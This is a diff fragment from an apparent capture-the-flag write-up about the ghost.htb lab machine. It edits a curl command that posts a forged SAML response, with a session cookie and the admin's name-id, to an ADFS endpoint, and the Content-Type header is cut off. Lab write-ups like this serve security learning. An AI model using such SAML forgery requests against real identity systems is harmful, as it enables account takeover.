@@ -1021,5 +1021,5 @@ I had to make a valid logon attempt using `justin.bradley` to capture a valid SA
 Ill use a random `--nameidformat` found in an article and the `--name-id` of the admin
 
 ```python
-curl -X POST https://core.ghost.htb:8443/adfs/
+curl -X POST https://core.ghost.htb:8443/adfs/saml/postResponse -H 'Cookie: connect.sid=s%3ADijqbGlwxzhTnK29JZ0VZvnx9TYwh3va.FxridJsxX6s1NHTLebRRAeZD%2Bd53hpyA%2BsjJaazMi7o' -H 'Content-Type: application/x-www-form-u'
 ```
